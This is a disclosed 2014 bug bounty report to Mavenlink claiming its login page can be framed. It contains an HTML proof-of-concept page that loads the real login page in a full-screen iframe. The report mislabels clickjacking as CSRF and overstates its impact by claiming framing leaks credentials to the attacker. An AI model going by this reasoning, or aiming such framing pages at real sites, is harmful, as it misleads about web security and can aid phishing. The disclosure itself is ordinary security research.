@@ -1,0 +1,59 @@
+ReportLink:https://hackerone.com/reports/14494
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/vineet
+ReportedTo:Mavenlink(mavenlink)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:19.09.2014 15:35:11
+
+Summary:
+
+Hello,
+My name is Vineet bhardwaj. i am security researcher and i pen test your website( https://app.mavenlink.com/login) and i found there is click jacking attack and CSRF attack can be done.
+
+POC:
+
+<html><head>
+<title> CSRF testing </title>
+<style>
+
+frame {
+
+opacity: 0.5;
+border: none;
+position: absolute;
+top: 0px;
+left: 0px;
+z-index: 1000;
+}
+</style>
+</head>
+<body>
+<script>
+window.onbeforeunload = function()
+{
+return " Do you want to leave ?";
+}
+</script>
+<p> site is vulnerable for CSRF! by Vineet bhardwaj</p>
+<iframe id="frame" width="100%" height="100%" src="https://app.mavenlink.com/login"></iframe>
+</body>
+</html>
+
+Procedure: 1. for test your website is vulnerable to clickjacking or CSRF or not ......
+open pen-test-for-CSRF.html (in attachment)
+
+2. in iframe tag give link to https://app.mavenlink.com/login (already given in .html file)
+
+save "pen-test-for-CSRF.html" open in your browser if your website open with the text "site is vulnerable " and given below with your whole site than your domain is vulnerable to clickjacking attack & CSRF.
+
+Impact: An attacker can host this domain in other evil site by using iframe and if a user fill the given filed it can directly redirect as logs to attacker and after its redirect to your web server.. its lead to steal user information too and use that host site as phishing of your site its CSRF and Clickjacking
+
+Note : check the attachment.;- 1. pent-test-for-CSRF.html
+2. image for proof
+
+waiting for positive response ........
+
+Thanks,
+Vineet
